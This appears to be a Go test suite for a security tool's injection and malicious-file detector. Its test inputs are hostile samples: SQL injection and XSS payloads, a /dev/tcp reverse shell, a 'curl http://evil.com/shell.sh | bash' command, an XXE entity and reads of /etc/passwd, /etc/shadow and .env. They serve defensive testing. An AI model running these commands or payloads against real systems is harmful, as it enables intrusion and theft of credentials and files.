package injection

import (
	"context"
	"strings"
	"sync"
	"testing"

	"github.com/1sec-project/1sec/internal/core"
	"github.com/rs/zerolog"
)

// ─── Helpers ─────────────────────────────────────────────────────────────────

type capPipeline struct {
	pipeline *core.AlertPipeline
	mu       sync.Mutex
	alerts   []*core.Alert
}

func newCapPipeline() *capPipeline {
	cp := &capPipeline{}
	cp.pipeline = core.NewAlertPipeline(zerolog.Nop(), 10000)
	cp.pipeline.AddHandler(func(a *core.Alert) {
		cp.mu.Lock()
		cp.alerts = append(cp.alerts, a)
		cp.mu.Unlock()
	})
	return cp
}

func (cp *capPipeline) count() int {
	cp.mu.Lock()
	defer cp.mu.Unlock()
	return len(cp.alerts)
}

func startedShield(t *testing.T) *Shield {
	t.Helper()
	s := New()
	cfg := core.DefaultConfig()
	if err := s.Start(context.Background(), nil, nil, cfg); err != nil {
		t.Fatalf("Shield.Start() error: %v", err)
	}
	t.Cleanup(func() { s.Stop() })
	return s
}

func startedShieldWithPipeline(t *testing.T, pipeline *core.AlertPipeline) *Shield {
	t.Helper()
	s := New()
	cfg := core.DefaultConfig()
	if err := s.Start(context.Background(), nil, pipeline, cfg); err != nil {
		t.Fatalf("Shield.Start() error: %v", err)
	}
	t.Cleanup(func() { s.Stop() })
	return s
}

func hasCategory(detections []Detection, cat string) bool {
	for _, d := range detections {
		if d.Category == cat {
			return true
		}
	}
	return false
}

// ─── Module Interface ─────────────────────────────────────────────────────────

var _ core.Module = (*Shield)(nil)

func TestShield_Name(t *testing.T) {
	s := New()
	if s.Name() != ModuleName {
		t.Errorf("Name() = %q, want %q", s.Name(), ModuleName)
	}
}

func TestShield_Description(t *testing.T) {
	s := New()
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

func TestShield_Start_Stop(t *testing.T) {
	s := New()
	cfg := core.DefaultConfig()
	if err := s.Start(context.Background(), nil, nil, cfg); err != nil {
		t.Fatalf("Start() error: %v", err)
	}
	if len(s.patterns) == 0 {
		t.Error("patterns should be compiled after Start()")
	}
	if err := s.Stop(); err != nil {
		t.Errorf("Stop() error: %v", err)
	}
}

// ─── SQL Injection ────────────────────────────────────────────────────────────

func TestAnalyzeInput_SQLi_Union(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("1 UNION SELECT username, password FROM users", "query")
	if !hasCategory(detections, "sqli") {
		t.Error("expected sqli detection for UNION SELECT")
	}
}

func TestAnalyzeInput_SQLi_OrTrue(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("' OR '1'='1'", "query")
	if !hasCategory(detections, "sqli") {
		t.Error("expected sqli detection for OR '1'='1'")
	}
}

func TestAnalyzeInput_SQLi_Stacked(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("1; DROP TABLE users", "query")
	if !hasCategory(detections, "sqli") {
		t.Error("expected sqli detection for stacked query ;DROP TABLE")
	}
}

func TestAnalyzeInput_SQLi_Sleep(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		"1 AND SLEEP(5)",
		"1 AND BENCHMARK(10000000, SHA1('test'))",
		"1; WAITFOR DELAY '0:0:5'",
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "query")
		if !hasCategory(detections, "sqli") {
			t.Errorf("expected sqli detection for time-based blind: %q", input)
		}
	}
}

func TestAnalyzeInput_SQLi_InformationSchema(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("SELECT * FROM information_schema.tables", "query")
	if !hasCategory(detections, "sqli") {
		t.Error("expected sqli detection for information_schema access")
	}
}

// ─── XSS ──────────────────────────────────────────────────────────────────────

func TestAnalyzeInput_XSS_ScriptTag(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("<script>alert('xss')</script>", "body")
	if !hasCategory(detections, "xss") {
		t.Error("expected xss detection for <script> tag")
	}
}

func TestAnalyzeInput_XSS_EventHandler(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		`<img onerror=alert(1)>`,
		`<body onload=alert(1)>`,
		`<div onclick=alert(1)>`,
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "body")
		if !hasCategory(detections, "xss") {
			t.Errorf("expected xss detection for event handler: %q", input)
		}
	}
}

func TestAnalyzeInput_XSS_JavascriptURI(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("javascript:alert(document.cookie)", "url")
	if !hasCategory(detections, "xss") {
		t.Error("expected xss detection for javascript: URI")
	}
}

func TestAnalyzeInput_XSS_DOMManipulation(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		"document.cookie",
		"document.write('test')",
		"eval('malicious')",
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "body")
		if !hasCategory(detections, "xss") {
			t.Errorf("expected xss detection for DOM manipulation: %q", input)
		}
	}
}

// ─── Command Injection ────────────────────────────────────────────────────────

func TestAnalyzeInput_CMDi_Pipe(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		"| cat /etc/passwd",
		"&& whoami",
		"; ls -la",
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "parameter")
		if !hasCategory(detections, "cmdi") {
			t.Errorf("expected cmdi detection for pipe/chain: %q", input)
		}
	}
}

func TestAnalyzeInput_CMDi_Subshell(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("$(whoami)", "parameter")
	if !hasCategory(detections, "cmdi") {
		t.Error("expected cmdi detection for $(whoami)")
	}
}

func TestAnalyzeInput_CMDi_ReverseShell(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "command")
	if !hasCategory(detections, "cmdi") {
		t.Error("expected cmdi detection for reverse shell")
	}
}

// ─── SSRF ─────────────────────────────────────────────────────────────────────

func TestAnalyzeInput_SSRF_InternalIP(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		"http://127.0.0.1/admin",
		"http://10.0.0.1/internal",
		"http://172.16.0.1/secret",
		"http://192.168.1.1/config",
		"http://localhost/admin",
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "url")
		if !hasCategory(detections, "ssrf") {
			t.Errorf("expected ssrf detection for internal IP: %q", input)
		}
	}
}

func TestAnalyzeInput_SSRF_CloudMetadata(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("http://169.254.169.254/latest/meta-data/", "url")
	if !hasCategory(detections, "ssrf") {
		t.Error("expected ssrf detection for cloud metadata endpoint")
	}
}

func TestAnalyzeInput_SSRF_FileScheme(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		"file:///etc/passwd",
		"gopher://127.0.0.1:25/",
		"dict://localhost:11211/",
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "url")
		if !hasCategory(detections, "ssrf") {
			t.Errorf("expected ssrf detection for scheme: %q", input)
		}
	}
}

// ─── LDAP Injection ───────────────────────────────────────────────────────────

func TestAnalyzeInput_LDAP_Injection(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		"*)(& (uid=admin)",
		"(|(uid=*)(cn=admin))",
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "ldap_filter")
		if !hasCategory(detections, "ldapi") {
			t.Errorf("expected ldapi detection for: %q", input)
		}
	}
}

// ─── Template Injection ───────────────────────────────────────────────────────

func TestAnalyzeInput_Template_Jinja(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("{{''.__class__.__mro__[1].__subclasses__()}}", "template")
	if !hasCategory(detections, "template") {
		t.Error("expected template injection detection for Jinja2 payload")
	}
}

// ─── NoSQL Injection ──────────────────────────────────────────────────────────

func TestAnalyzeInput_NoSQL_Operator(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		`{"$gt": ""}`,
		`{"$ne": null}`,
		`{"$where": "this.password == 'test'"}`,
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "json_body")
		if !hasCategory(detections, "nosql") {
			t.Errorf("expected nosql detection for: %q", input)
		}
	}
}

// ─── Path Traversal ───────────────────────────────────────────────────────────

func TestAnalyzeInput_PathTraversal(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("../../etc/passwd", "filename")
	if !hasCategory(detections, "path") {
		t.Error("expected path traversal detection for ../../etc/passwd")
	}
}

func TestAnalyzeInput_PathTraversal_SensitiveFiles(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		"/etc/passwd",
		"/etc/shadow",
		".env",
		".git/config",
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "filename")
		if !hasCategory(detections, "path") {
			t.Errorf("expected path detection for sensitive file: %q", input)
		}
	}
}

func TestAnalyzeInput_NullByte(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("file.php%00.jpg", "filename")
	if !hasCategory(detections, "path") {
		t.Error("expected path detection for null byte injection")
	}
}

// ─── Clean Input (No False Positives) ─────────────────────────────────────────

func TestAnalyzeInput_CleanInput(t *testing.T) {
	s := startedShield(t)
	cleanInputs := []string{
		"Hello, how are you today?",
		"The quick brown fox jumps over the lazy dog",
		"user@example.com",
		"John Smith",
		"Order #12345 has been shipped",
		"Please review the attached document",
	}
	for _, input := range cleanInputs {
		detections := s.AnalyzeInput(input, "body")
		if len(detections) > 0 {
			t.Errorf("expected no detections for clean input %q, got %d", input, len(detections))
		}
	}
}

// ─── URL Encoded Payloads ─────────────────────────────────────────────────────

func TestAnalyzeInput_URLEncoded(t *testing.T) {
	s := startedShield(t)
	// URL-encoded <script>alert(1)</script>
	encoded := "%3Cscript%3Ealert(1)%3C/script%3E"
	detections := s.AnalyzeInput(encoded, "query")
	if !hasCategory(detections, "xss") {
		t.Error("expected xss detection for URL-encoded <script> tag")
	}
}

// ─── normalizeInput ───────────────────────────────────────────────────────────

func TestNormalizeInput(t *testing.T) {
	cases := []struct {
		name  string
		input string
		want  string
	}{
		// Basic URL decoding (existing tests)
		{"url_script_tag", "%3Cscript%3E", "<script>"},
		{"url_sqli", "%27 OR %271%27=%271", "' OR '1'='1"},
		{"passthrough", "hello world", "hello world"},

		// Double URL encoding
		{"double_encode", "%253Cscript%253E", "<script>"},

		// HTML entity decoding — named
		{"html_named_lt_gt", "&lt;script&gt;", "<script>"},
		{"html_named_amp", "1 &amp; 2", "1 & 2"},
		{"html_named_quot", "&quot;hello&quot;", "\"hello\""},

		// HTML entity decoding — numeric decimal
		{"html_decimal", "&#60;script&#62;", "<script>"},

		// HTML entity decoding — numeric hex
		{"html_hex", "&#x3C;script&#x3E;", "<script>"},

		// Backslash hex escapes
		{"backslash_hex", "\\x3Cscript\\x3E", "<script>"},

		// Backslash unicode escapes
		{"backslash_unicode", "\\u003Cscript\\u003E", "<script>"},

		// SQL comment stripping
		{"sql_comment_evasion", "SEL/**/ECT", "SELECT"},
		{"sql_comment_union", "UN/*bypass*/ION SEL/**/ECT", "UNION SELECT"},

		// Whitespace normalization
		{"tab_evasion", "SELECT\t*\tFROM", "SELECT * FROM"},
		{"newline_evasion", "SELECT\n*\nFROM", "SELECT * FROM"},
		{"multi_space_collapse", "SELECT   *   FROM", "SELECT * FROM"},

		// Fullwidth character normalization
		{"fullwidth_parens", "\uFF08\uFF09", "()"},
		{"fullwidth_angle", "\uFF1Cscript\uFF1E", "<script>"},
		{"fullwidth_slash", "\uFF0Fetc\uFF0Fpasswd", "/etc/passwd"},

		// Cyrillic homoglyph normalization
		{"cyrillic_select", "S\u0415L\u0415\u0421T", "SELECT"},

		// Null byte stripping
		{"null_byte", "admin\x00' OR '1'='1", "admin' OR '1'='1"},

		// Combined evasion — real-world attack pattern
		{"combined_evasion", "%253C%2573cript%253E", "<script>"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := normalizeInput(tc.input)
			if got != tc.want {
				t.Errorf("normalizeInput(%q) = %q, want %q", tc.input, got, tc.want)
			}
		})
	}
}

// ─── extractScanFields ────────────────────────────────────────────────────────

func TestExtractScanFields(t *testing.T) {
	ev := core.NewSecurityEvent("test", "http_request", core.SeverityInfo, "test request")
	ev.Details["url"] = "http://example.com/api"
	ev.Details["body"] = `{"user": "admin"}`
	ev.Details["query"] = "id=1"
	ev.Details["empty_field"] = ""

	fields := extractScanFields(ev)
	if fields["url"] != "http://example.com/api" {
		t.Errorf("url field = %q, want 'http://example.com/api'", fields["url"])
	}
	if fields["body"] != `{"user": "admin"}` {
		t.Error("body field not extracted correctly")
	}
	if fields["query"] != "id=1" {
		t.Error("query field not extracted correctly")
	}
	// Empty fields should not be included
	if _, ok := fields["empty_field"]; ok {
		t.Error("empty fields should not be included")
	}
	// Summary should be included
	if fields["summary"] != "test request" {
		t.Error("summary should be included in scan fields")
	}
}

// ─── categoryLabel ────────────────────────────────────────────────────────────

func TestCategoryLabel(t *testing.T) {
	cases := []struct {
		cat  string
		want string
	}{
		{"sqli", "SQL Injection"},
		{"xss", "Cross-Site Scripting"},
		{"cmdi", "Command Injection"},
		{"ssrf", "Server-Side Request Forgery"},
		{"ldapi", "LDAP Injection"},
		{"template", "Template Injection"},
		{"nosql", "NoSQL Injection"},
		{"path", "Path Traversal"},
		{"unknown", "unknown"},
	}
	for _, tc := range cases {
		got := categoryLabel(tc.cat)
		if got != tc.want {
			t.Errorf("categoryLabel(%q) = %q, want %q", tc.cat, got, tc.want)
		}
	}
}

// ─── HandleEvent Integration ──────────────────────────────────────────────────

func TestShield_HandleEvent(t *testing.T) {
	cp := newCapPipeline()
	s := startedShieldWithPipeline(t, cp.pipeline)

	ev := core.NewSecurityEvent("test", "http_request", core.SeverityInfo, "request")
	ev.Details["query"] = "1 UNION SELECT username, password FROM users"
	ev.SourceIP = "10.0.0.1"
	ev.UserAgent = "Mozilla/5.0"

	if err := s.HandleEvent(ev); err != nil {
		t.Fatalf("HandleEvent() error: %v", err)
	}

	if cp.count() == 0 {
		t.Error("expected alert for SQL injection in http_request")
	}
}

// ─── Deserialization Pattern Tests ────────────────────────────────────────────

func TestAnalyzeInput_Deser_JavaGadget(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		"ObjectInputStream.readObject()",
		"org.apache.commons.collections.functors.InvokerTransformer",
		"ysoserial payload CommonsCollections1",
		"ChainedTransformer(new ConstantTransformer(Runtime.class))",
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "body")
		if !hasCategory(detections, "deser") {
			t.Errorf("expected deser detection for %q", input)
		}
	}
}

func TestAnalyzeInput_Deser_DotNet(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		"BinaryFormatter.Deserialize(stream)",
		"TypeNameHandling.All",
		"new ObjectStateFormatter().Deserialize(data)",
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "body")
		if !hasCategory(detections, "deser") {
			t.Errorf("expected deser detection for %q", input)
		}
	}
}

func TestAnalyzeInput_Deser_XMLEntity(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		`<!ENTITY xxe SYSTEM "file:///etc/passwd">`,
		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com">]>`,
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "body")
		if !hasCategory(detections, "deser") {
			t.Errorf("expected deser detection for %q", input)
		}
	}
}

func TestAnalyzeInput_Deser_PHP(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput(`O:8:"Exploiter":1:{s:4:"cmd";s:6:"whoami";}`, "body")
	if !hasCategory(detections, "deser") {
		t.Error("expected deser detection for PHP serialized object")
	}
}

func TestAnalyzeInput_Deser_PythonPickle(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		"pickle.loads(user_data)",
		"yaml.unsafe_load(config)",
		"__reduce__ exploit",
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "body")
		if !hasCategory(detections, "deser") {
			t.Errorf("expected deser detection for %q", input)
		}
	}
}

// ─── Blind SQLi Pattern Tests ─────────────────────────────────────────────────

func TestAnalyzeInput_SQLi_BlindBoolean(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		"1 AND 1=1",
		"admin' AND '1'='1",
		"id=1 AND substring(username,1,1)='a'",
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "query")
		if !hasCategory(detections, "sqli") {
			t.Errorf("expected sqli detection for blind boolean: %q", input)
		}
	}
}

func TestAnalyzeInput_SQLi_BlindTime(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		"1; SELECT pg_sleep(5)",
		"1 AND dbms_pipe.receive_message('a',5)=0",
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "query")
		if !hasCategory(detections, "sqli") {
			t.Errorf("expected sqli detection for blind time: %q", input)
		}
	}
}

func TestAnalyzeInput_SQLi_BlindError(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("convert(int, @@version)", "query")
	if !hasCategory(detections, "sqli") {
		t.Error("expected sqli detection for error-based blind SQLi")
	}
}

// ─── Zip Slip Pattern Tests ───────────────────────────────────────────────────

func TestAnalyzeInput_ZipSlip(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		"../../etc/cron.d/backdoor.sh",
		"../../../webapps/ROOT/shell.jsp",
		"..\\..\\wwwroot\\cmd.aspx",
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "archive_entry")
		if !hasCategory(detections, "path") {
			t.Errorf("expected path detection for zip slip: %q", input)
		}
	}
}

// ─── Dual-Pass Scanning Test ──────────────────────────────────────────────────

func TestAnalyzeInput_DualPass_OriginalAndNormalized(t *testing.T) {
	s := startedShield(t)
	// %00 is a null byte in URL encoding — the normalizer decodes and strips it,
	// but the original input should still match the path_null_byte pattern
	detections := s.AnalyzeInput("file.php%00.jpg", "filename")
	if !hasCategory(detections, "path") {
		t.Error("expected path detection for null byte in original input (dual-pass)")
	}
}

func TestAnalyzeInput_NormalizationCatchesEncoded(t *testing.T) {
	s := startedShield(t)
	// HTML-encoded XSS — only detectable after normalization
	detections := s.AnalyzeInput("&#60;script&#62;alert(1)&#60;/script&#62;", "body")
	if !hasCategory(detections, "xss") {
		t.Error("expected xss detection after HTML entity normalization")
	}
}

func TestAnalyzeInput_SQLCommentEvasion(t *testing.T) {
	s := startedShield(t)
	// SQL comment splitting — UN/**/ION SEL/**/ECT should normalize to UNION SELECT
	detections := s.AnalyzeInput("1 UN/**/ION SEL/**/ECT username FROM users", "query")
	if !hasCategory(detections, "sqli") {
		t.Error("expected sqli detection after SQL comment stripping")
	}
}

// ─── FileSentinel Archive Traversal Test ──────────────────────────────────────

func TestFileSentinel_CheckArchiveTraversal(t *testing.T) {
	fs := &FileSentinel{}

	// Build a minimal ZIP with a traversal entry name: ../../evil.jsp
	// ZIP local file header: PK\x03\x04 + 26 bytes + filename
	entryName := "../../evil.jsp"
	header := make([]byte, 30+len(entryName))
	// Signature
	header[0], header[1], header[2], header[3] = 0x50, 0x4B, 0x03, 0x04
	// Filename length at offset 26 (little-endian)
	header[26] = byte(len(entryName))
	header[27] = 0
	copy(header[30:], entryName)

	findings := fs.Analyze(header, ".zip", "application/zip")
	found := false
	for _, f := range findings {
		if f.Type == "zip_slip_traversal" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected zip_slip_traversal finding for archive with ../../evil.jsp entry")
	}
}

func TestFileSentinel_CleanArchive(t *testing.T) {
	fs := &FileSentinel{}

	// Build a minimal ZIP with a clean entry name
	entryName := "images/photo.jpg"
	header := make([]byte, 30+len(entryName))
	header[0], header[1], header[2], header[3] = 0x50, 0x4B, 0x03, 0x04
	header[26] = byte(len(entryName))
	header[27] = 0
	copy(header[30:], entryName)

	findings := fs.Analyze(header, ".zip", "application/zip")
	for _, f := range findings {
		if f.Type == "zip_slip_traversal" {
			t.Error("did not expect zip_slip_traversal for clean archive entry")
		}
	}
}

func TestFileSentinel_CheckPDFHeaderConsistency(t *testing.T) {
	fs := &FileSentinel{}
	data := []byte("%PDF-1.7\n1 0 obj\n<< /Length 99999999 >>\nstream\nAAAA")

	findings := fs.Analyze(data, ".pdf", "application/pdf")
	found := false
	for _, f := range findings {
		if f.Type == "deep_header_anomaly" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected deep_header_anomaly for implausible PDF stream length")
	}
}

func TestFileSentinel_CheckJP2HeaderConsistency(t *testing.T) {
	fs := &FileSentinel{}
	data := []byte{
		0x00, 0x10, 0x00, 0x00, // implausibly large box length relative to buffer
		0x6A, 0x50, 0x20, 0x20,
		0x0D, 0x0A, 0x87, 0x0A,
		0x00, 0x00, 0x00, 0x14,
	}

	findings := fs.Analyze(data, ".jp2", "image/jp2")
	found := false
	for _, f := range findings {
		if f.Type == "deep_header_anomaly" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected deep_header_anomaly for inconsistent JP2 box length")
	}
}

// ─── Canary Token / Leaked Credential Detection ──────────────────────────────

func TestFileSentinel_DeepEmbeddedExecutable(t *testing.T) {
	fs := &FileSentinel{}
	data := testPNGBuffer(96 * 1024)
	peOffset := deepHeaderWindow + 8192
	writeMinimalPE(data, peOffset)

	findings := fs.Analyze(data, ".png", "image/png")
	found := false
	for _, f := range findings {
		if f.Type == "embedded_executable" {
			found = true
			if !strings.Contains(f.Description, itoa(peOffset)) {
				t.Fatalf("expected embedded executable offset %d, got %q", peOffset, f.Description)
			}
			break
		}
	}
	if !found {
		t.Fatal("expected embedded_executable for PE payload beyond header window")
	}
}

func TestFileSentinel_DeepShellcodeSignature(t *testing.T) {
	fs := &FileSentinel{}
	data := testPNGBuffer(96 * 1024)
	shellcodeOffset := deepHeaderWindow + 12000
	copy(data[shellcodeOffset:], []byte{0x6A, 0x3B, 0x58, 0x99})

	findings := fs.Analyze(data, ".png", "image/png")
	found := false
	for _, f := range findings {
		if f.Type == "shellcode_signature" {
			found = true
			if !strings.Contains(f.Description, itoa(shellcodeOffset)) {
				t.Fatalf("expected shellcode offset %d, got %q", shellcodeOffset, f.Description)
			}
			break
		}
	}
	if !found {
		t.Fatal("expected shellcode_signature beyond header window")
	}
}

func TestFileSentinel_DeepRandomMZDoesNotTriggerPE(t *testing.T) {
	fs := &FileSentinel{}
	data := testPNGBuffer(96 * 1024)
	copy(data[deepHeaderWindow+4096:], []byte("MZnot-a-pe-file"))

	findings := fs.Analyze(data, ".png", "image/png")
	for _, f := range findings {
		if f.Type == "embedded_executable" {
			t.Fatalf("did not expect embedded_executable for random MZ bytes: %q", f.Description)
		}
	}
}

func TestAnalyzeInput_CRLFMetricInjection(t *testing.T) {
	shield := New()
	shield.patterns = compilePatterns()

	tests := []string{
		"value=100%0Aevil_tag:1|c",
		"value=100\r\nlatency.pwned:250|ms|#source:request",
	}
	for _, input := range tests {
		detections := shield.AnalyzeInput(input, "query")
		found := false
		for _, detection := range detections {
			if detection.PatternName == "crlf_metric_injection" {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("expected CRLF metric injection detection for %q", input)
		}
	}
}

func TestAnalyzeInput_AllowsOrdinaryMetricText(t *testing.T) {
	shield := New()
	shield.patterns = compilePatterns()
	if detections := shield.AnalyzeInput("metric=requests.total:1|c", "body"); len(detections) != 0 {
		t.Fatalf("expected ordinary metric text to pass, got %#v", detections)
	}
}

func testPNGBuffer(size int) []byte {
	data := make([]byte, size)
	copy(data, knownMagic["png"])
	return data
}

func writeMinimalPE(data []byte, offset int) {
	copy(data[offset:], []byte{'M', 'Z'})
	peOffset := 0x80
	data[offset+0x3c] = byte(peOffset)
	copy(data[offset+peOffset:], []byte{'P', 'E', 0x00, 0x00})
}

func TestAnalyzeInput_Canary_AWSKey(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("AKIAIOSFODNN7EXAMPLE", "header")
	if len(detections) == 0 {
		t.Fatal("expected canary_aws_key detection")
	}
	found := false
	for _, d := range detections {
		if d.Category == "canary" {
			found = true
		}
	}
	if !found {
		t.Error("expected category 'canary' for AWS key detection")
	}
}

func TestAnalyzeInput_Canary_GitHubToken(t *testing.T) {
	s := startedShield(t)
	// ghp_ format (classic PAT)
	detections := s.AnalyzeInput("ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij", "header")
	if len(detections) == 0 {
		t.Fatal("expected canary_github_token detection for ghp_ token")
	}
	hasCanary := false
	for _, d := range detections {
		if d.Category == "canary" {
			hasCanary = true
		}
	}
	if !hasCanary {
		t.Error("expected canary category for GitHub token")
	}
}

func TestAnalyzeInput_Canary_SlackToken(t *testing.T) {
	s := startedShield(t)
	token := "xoxb-" + "0000000000" + "-" + "0000000000" + "-" + "ABCDEFGHIJKLMNOPQRSTUVWX"
	detections := s.AnalyzeInput(token, "header")
	if len(detections) == 0 {
		t.Fatal("expected canary_slack_token detection")
	}
}

func TestAnalyzeInput_Canary_PrivateKey(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("-----BEGIN RSA PRIVATE KEY-----", "body")
	if len(detections) == 0 {
		t.Fatal("expected canary_private_key detection")
	}
}

func TestAnalyzeInput_Canary_JWT(t *testing.T) {
	s := startedShield(t)
	// Minimal JWT-like structure
	jwt := "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"
	detections := s.AnalyzeInput(jwt, "header")
	if len(detections) == 0 {
		t.Fatal("expected canary_jwt_token detection")
	}
}

func TestAnalyzeInput_Canary_GCPServiceAccount(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput(`{"type": "service_account", "project_id": "test"}`, "body")
	if len(detections) == 0 {
		t.Fatal("expected canary_gcp_service_account detection")
	}
}

func TestAnalyzeInput_Canary_CleanInput_NoFalsePositive(t *testing.T) {
	s := startedShield(t)
	// Normal strings that should NOT trigger canary detection
	cleanInputs := []string{
		"This is a normal API response",
		"Authorization: Bearer some-short-token",
		"The user's account type is premium",
	}
	for _, input := range cleanInputs {
		detections := s.AnalyzeInput(input, "body")
		for _, d := range detections {
			if d.Category == "canary" {
				t.Errorf("false positive canary detection on clean input %q: %s", input, d.PatternName)
			}
		}
	}
}

// ─── Unicode NFKC Path Traversal — CVE-2026-25673 ─────────────────────────

func TestAnalyzeInput_UnicodeNFKC_PathTraversal(t *testing.T) {
	s := startedShield(t)

	// Fullwidth-encoded percent sequences that normalize to ../
	maliciousInputs := []string{
		"%ef%bc%8e%ef%bc%8e%ef%bc%8f",   // fullwidth ../ in percent encoding
		"%uFF0E%uFF0E%uFF0F",            // %uXXXX style fullwidth ../
		"\uFF0E\uFF0E/etc/passwd",       // raw fullwidth dots + slash
		"\uFF0E\uFF0E\uFF0F etc/passwd", // raw fullwidth dots + fullwidth slash
	}
	for _, input := range maliciousInputs {
		detections := s.AnalyzeInput(input, "path")
		if !hasCategory(detections, "path") {
			t.Errorf("expected path traversal detection for Unicode NFKC input %q", input)
		}
	}
}

// ─── Management Interface RCE — CVE-2025-67840 / CVE-2025-63911 ──────────

func TestAnalyzeInput_MgmtInterfaceRCE(t *testing.T) {
	s := startedShield(t)

	xmlrpcPayload := `<member><name>os_system</name><value><string>curl http://evil.com/shell.sh | bash</string></value></member>`
	detections := s.AnalyzeInput(xmlrpcPayload, "body")
	if !hasCategory(detections, "cmdi") {
		t.Error("expected cmdi detection for WatchGuard XMLRPC payload")
	}

	jsonPayload := `{"command": "ls || whoami"}`
	detections = s.AnalyzeInput(jsonPayload, "body")
	if !hasCategory(detections, "cmdi") {
		t.Error("expected cmdi detection for Cohesity API JSON payload")
	}
}

// ─── Unicode Folding Normalization (Phase 8) ──────────────────────────────

func TestNormalizeInput_UnicodeFolding(t *testing.T) {
	// Fullwidth 'A' (U+FF21) should fold to ASCII 'A'
	input := "\uFF21\uFF22\uFF23"
	result := normalizeInput(input)
	if result != "ABC" {
		t.Errorf("expected 'ABC', got %q", result)
	}

	// Fullwidth period (U+FF0E) should fold to '.'
	input = "\uFF0E\uFF0E\uFF0F"
	result = normalizeInput(input)
	if result != "../" {
		t.Errorf("expected '../', got %q", result)
	}

	// Mathematical bold 'a' (U+1D41A) should fold to 'a'
	input = "\U0001D41A\U0001D41B\U0001D41C"
	result = normalizeInput(input)
	if result != "abc" {
		t.Errorf("expected 'abc', got %q", result)
	}
}

func TestFoldUnicode_FullwidthDigits(t *testing.T) {
	// Fullwidth digits U+FF10..U+FF19 → 0..9
	input := "\uFF10\uFF11\uFF12\uFF13"
	result := foldUnicode(input)
	if result != "0123" {
		t.Errorf("expected '0123', got %q", result)
	}
}

func TestFoldUnicode_PassesASCII(t *testing.T) {
	input := "hello world 123"
	result := foldUnicode(input)
	if result != input {
		t.Errorf("expected ASCII passthrough, got %q", result)
	}
}

// ─── Category Label Tests (updated) ──────────────────────────────────────────

func TestCategoryLabel_Canary(t *testing.T) {
	label := categoryLabel("canary")
	if label != "Canary Token / Leaked Credential" {
		t.Errorf("expected 'Canary Token / Leaked Credential', got %q", label)
	}
}
